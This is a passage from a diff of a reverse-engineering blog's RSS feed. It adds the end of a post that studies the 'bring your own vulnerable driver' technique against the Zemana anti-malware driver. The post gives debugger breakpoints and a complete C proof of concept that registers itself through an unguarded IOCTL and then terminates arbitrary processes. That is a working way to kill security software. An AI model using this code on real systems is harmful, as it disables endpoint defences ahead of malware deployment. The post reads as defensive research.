+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bu Terminator+0x10B14
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/quickstudyBYOVD//check_if_terminate_reached.png&quot; alt=&quot;check_if_terminate_reached.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here, we will observe that after resuming the process, the breakpoint was not hit. This means that there might be a check before executing the corresponding instructions.&lt;/p&gt;
+
+&lt;h2 id=&quot;can-i-authorize-myself&quot;&gt;Can I Authorize Myself?&lt;/h2&gt;
+
+&lt;p&gt;Just before sending IOCTL, there was a check to see if PIDs are registered. Before that is done, the PID of the driver is passed. The purpose is to also authorize itself.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quickstudyBYOVD//Check_if_pid_registered_sub140009bec.png&quot; alt=&quot;/images/quickstudyBYOVD//Check_if_pid_registered_sub140009bec.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After some reversing and debugging, we see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Check_IF_PID_Registered_sub_140009BEC&lt;/code&gt; initially does not have any registered PID (external processes). Because of that, the  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IS_PID_WHITELISTED&lt;/code&gt; value is never 1. Furthermore, it is checking through the PID list of registered processes that are authorized to send IOCTLs.&lt;/p&gt;
+
+&lt;p&gt;That said, looking into how &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;numRegisteredPID&lt;/code&gt; is set should give us an idea on how these PID are registered. Looking at the cross references, we see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Check_IF_PID_Registered_sub_140009BEC&lt;/code&gt; is called from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;register_PID_if_not_registered_sub_140009DB0&lt;/code&gt; which is called from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_140010270&lt;/code&gt; which is also called from executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_REGISTER_PROCESS&lt;/code&gt; control code.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quickstudyBYOVD//IOCTL_REGISTER_PROCESS.png&quot; alt=&quot;IOCTL_REGISTER_PROCESS.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Checking the conditions above again, we can see that this control code is exempted from the checks.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quickstudyBYOVD//IOCTL_REGISTER_PROCESS_EXEMPTED.png&quot; alt=&quot;/images/quickstudyBYOVD//IOCTL_REGISTER_PROCESS_EXEMPTED.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This means also that there is no further check to see who could send this particular control code very similar to that of authentication bypass. This means that an external process with administrative privilege is able to register itself as trusted process which can send control codes.&lt;/p&gt;
+
+&lt;h2 id=&quot;second-attempt-success&quot;&gt;Second Attempt (Success)&lt;/h2&gt;
+
+&lt;p&gt;This time, I have added another &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DeviceIoControl&lt;/code&gt; to send &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_REGISTER_PROCESS&lt;/code&gt; code. I have also edited the POC a little to make it easier for testing.&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LONGLONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOCTL_TERMINATE_PROCESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80002048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LONGLONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOCTL_REGISTER_PROCESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80002010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PID_TO_TERMINATE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: RootCauseTerminator.exe &amp;lt;TargetPID&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;PID_TO_TERMINATE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// Open a handle to the device through the symbolic link&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ZemanaAntiMalware&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;GENERIC_READ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;OPEN_EXISTING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;FILE_ATTRIBUTE_NORMAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INVALID_HANDLE_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to open handle to device. Error: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetLastError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    
+    &lt;span class=&quot;c1&quot;&gt;// Register this executable PID to allow itself to send IOCTL_TERMINATE_PROCESS control code to terminator driver.&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regProcessInput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetCurrentProcessId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOCTL_REGISTER_PROCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regProcessInput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regProcessInput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to register itself...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REGISTERED SUCCESSFULLY&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+    &lt;span class=&quot;c1&quot;&gt;// Send control code IOCTL_TERMINATE_PROCESS to the driver&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PID_TO_TERMINATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOCTL_TERMINATE_PROCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to Terminate PID %d via control code. Error: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PID_TO_TERMINATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetLastError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Successfully terminated PID %d after sending control code.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PID_TO_TERMINATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// Close the handle&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;110-it-works&quot;&gt;110% It Works?&lt;/h2&gt;
+
+&lt;p&gt;First thing to verify is to check that the POC has managed to register and authorize itself to send control code.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Check value of v9 for control code
+# if ( v9 != 0x80002010 ) 
+bu Terminator+0x1054D
+
+# Check PID and make sure it matches executable
+# Check with !process 0 0 RootCauseTerminator.exe
+bu Terminator+0x09DDB
+
+# Check if this is hit. If yes, then we have registered ourselves
+# if breakpoint fails to hit, then we failed
+#  numRegisteredPID = (numRegisteredPID + 1) % 0x64ui64;
+bu Terminator+0x09EE8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Sure enough, the control code was received.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quickstudyBYOVD//registeredcode.png&quot; alt=&quot;registeredcode.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Also, we can verify that the PID of the executable is being registered because the PID matches and that the numRegisteredPID was successfully incremented.&lt;/p&gt;
+
+&lt;p&gt;Next thing to verify termination is to check that the POC can now enter into the block for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_TERMINATE_PROCESS&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Enter into case 0x80002048 (IOCTL_TERMINATE_PROCESS)
+bu Terminator+0x10B14
+
+# Check the PID of notepad with this value in rdi
+bu Terminator+0x132C6
+
+# Check if this breakpoint gets hit
+# call cs:ZwTerminateProcess
+bu Terminator+0x013487
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The following shows that it can kill the targeted PID. The PID is confirmed to belong to the notepad process and the call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZwTerminateProcess&lt;/code&gt; is also successful.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quickstudyBYOVD//process_kill.png&quot; alt=&quot;process_kill.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ultimately, the process would be wiped off process hacker.&lt;/p&gt;
+
+&lt;h2 id=&quot;zeromemoryexs-terminator-reproduction&quot;&gt;ZeroMemoryEx’s Terminator Reproduction&lt;/h2&gt;
+
+&lt;p&gt;As mentioned previously, ZeroMemoryEx has reproduced SpyBoy’s work as seen in &lt;a href=&quot;https://github.com/ZeroMemoryEx/Terminator&quot;&gt;https://github.com/ZeroMemoryEx/Terminator&lt;/a&gt; which I have referenced. It would loop through all the processes to search for any blacklisted Security Product for termination and terminating them.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quickstudyBYOVD//blacklistprocesses.png&quot; alt=&quot;/images/quickstudyBYOVD//blacklistprocesses.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This demonstrates the possibility of attackers, after some form of privilege escalation, installing other malware/payloads with higher confidence of not being flagged too early at the very least.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;This short study had helped me understand how LOLbins may be abused for malicious intent. It also helped me understand how these can be applied in an attack chain to further evade detections as well from different security solutions.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+</description>
+        <pubDate>Tue, 13 Jun 2023 01:27:00 +0000</pubDate>
+        <link>http://0.0.0.0:8000/2023/06/13/Quick_Study_of_BYOVD/</link>
+        <guid isPermaLink="true">http://0.0.0.0:8000/2023/06/13/Quick_Study_of_BYOVD/</guid>
+        
+        <category>QuickPeek</category>
+        
+        <category>Writeups</category>
+        
+        
+      </item>
     
       <item>
         <title>Alien Saboteaur - HTB Cyber Apocalyse 2023</title>
@@ -877,8 +1173,8 @@ vm_exit
 
 </description>
         <pubDate>Sat, 25 Mar 2023 18:45:00 +0000</pubDate>
-        <link>https://owl4444.github.io/2023/03/25/Alien_Saboteaur_HTB_Cyber_Apocalypse_2023/</link>
-        <guid isPermaLink="true">https://owl4444.github.io/2023/03/25/Alien_Saboteaur_HTB_Cyber_Apocalypse_2023/</guid>
+        <link>http://0.0.0.0:8000/2023/03/25/Alien_Saboteaur_HTB_Cyber_Apocalypse_2023/</link>
+        <guid isPermaLink="true">http://0.0.0.0:8000/2023/03/25/Alien_Saboteaur_HTB_Cyber_Apocalypse_2023/</guid>
         
         <category>Writeups</category>
         
@@ -1132,8 +1428,8 @@ C:\vshsn.exe
 
 </description>
         <pubDate>Sat, 11 Mar 2023 09:54:00 +0000</pubDate>
-        <link>https://owl4444.github.io/2023/03/11/A_quick_peek_at_a_dropper_and_downloader/</link>
-        <guid isPermaLink="true">https://owl4444.github.io/2023/03/11/A_quick_peek_at_a_dropper_and_downloader/</guid>
+        <link>http://0.0.0.0:8000/2023/03/11/A_quick_peek_at_a_dropper_and_downloader/</link>
+        <guid isPermaLink="true">http://0.0.0.0:8000/2023/03/11/A_quick_peek_at_a_dropper_and_downloader/</guid>
         
         <category>QuickPeek</category>
         
@@ -1337,8 +1633,8 @@ Commands used were &lt;code class=&quot;language-plaintext highlighter-rouge&quo
 &lt;hr /&gt;
 </description>
         <pubDate>Sat, 12 Nov 2022 10:10:00 +0000</pubDate>
-        <link>https://owl4444.github.io/2022/11/12/Flare-on-9_chall_9_and_11/</link>
-        <guid isPermaLink="true">https://owl4444.github.io/2022/11/12/Flare-on-9_chall_9_and_11/</guid>
+        <link>http://0.0.0.0:8000/2022/11/12/Flare-on-9_chall_9_and_11/</link>
+        <guid isPermaLink="true">http://0.0.0.0:8000/2022/11/12/Flare-on-9_chall_9_and_11/</guid>
         
         <category>Writeups</category>
         
@@ -1733,8 +2029,8 @@ Now, if no value ‘1’s are adjacent to each other in all eight directions, th
 
 </description>
         <pubDate>Sun, 25 Sep 2022 19:08:00 +0000</pubDate>
-        <link>https://owl4444.github.io/2022/09/25/Trying_out_z3_solver_(_DUCTF2022-EZPZ-rev-pwn)/</link>
-        <guid isPermaLink="true">https://owl4444.github.io/2022/09/25/Trying_out_z3_solver_(_DUCTF2022-EZPZ-rev-pwn)/</guid>
+        <link>http://0.0.0.0:8000/2022/09/25/Trying_out_z3_solver_(_DUCTF2022-EZPZ-rev-pwn)/</link>
+        <guid isPermaLink="true">http://0.0.0.0:8000/2022/09/25/Trying_out_z3_solver_(_DUCTF2022-EZPZ-rev-pwn)/</guid>
         
         <category>Writeups</category>
         
@@ -2042,8 +2338,8 @@ call rdi  ; Call WinExec
 
 </description>
         <pubDate>Fri, 09 Sep 2022 22:31:00 +0000</pubDate>
-        <link>https://owl4444.github.io/2022/09/09/Understanding_64_bits_Windows_10_Shellcode_part_2/</link>
-        <guid isPermaLink="true">https://owl4444.github.io/2022/09/09/Understanding_64_bits_Windows_10_Shellcode_part_2/</guid>
+        <link>http://0.0.0.0:8000/2022/09/09/Understanding_64_bits_Windows_10_Shellcode_part_2/</link>
+        <guid isPermaLink="true">http://0.0.0.0:8000/2022/09/09/Understanding_64_bits_Windows_10_Shellcode_part_2/</guid>
         
         <category>Writeups</category>
         
@@ -2174,8 +2470,8 @@ call rdi  ; Call WinExec
 
 </description>
         <pubDate>Wed, 07 Sep 2022 21:12:00 +0000</pubDate>
-        <link>https://owl4444.github.io/2022/09/07/Understanding_64_bits_Windows_10_Shellcode/</link>
-        <guid isPermaLink="true">https://owl4444.github.io/2022/09/07/Understanding_64_bits_Windows_10_Shellcode/</guid>
+        <link>http://0.0.0.0:8000/2022/09/07/Understanding_64_bits_Windows_10_Shellcode/</link>
+        <guid isPermaLink="true">http://0.0.0.0:8000/2022/09/07/Understanding_64_bits_Windows_10_Shellcode/</guid>
         
         <category>Writeups</category>
         
@@ -2366,8 +2662,8 @@ FileOffsetAddress = 0x142c
 
 </description>
         <pubDate>Tue, 06 Sep 2022 20:23:00 +0000</pubDate>
-        <link>https://owl4444.github.io/2022/09/06/Flare-On-2016-DudeLocker/</link>
-        <guid isPermaLink="true">https://owl4444.github.io/2022/09/06/Flare-On-2016-DudeLocker/</guid>
+        <link>http://0.0.0.0:8000/2022/09/06/Flare-On-2016-DudeLocker/</link>
+        <guid isPermaLink="true">http://0.0.0.0:8000/2022/09/06/Flare-On-2016-DudeLocker/</guid>
         
         <category>Writeups</category>
         
@@ -2390,8 +2686,8 @@ FileOffsetAddress = 0x142c
 
 </description>
         <pubDate>Mon, 05 Sep 2022 21:08:00 +0000</pubDate>
-        <link>https://owl4444.github.io/2022/09/05/Welcome-to-my-blog-everyone/</link>
-        <guid isPermaLink="true">https://owl4444.github.io/2022/09/05/Welcome-to-my-blog-everyone/</guid>
+        <link>http://0.0.0.0:8000/2022/09/05/Welcome-to-my-blog-everyone/</link>
+        <guid isPermaLink="true">http://0.0.0.0:8000/2022/09/05/Welcome-to-my-blog-everyone/</guid>
         
         <category>Welcome</category>
         
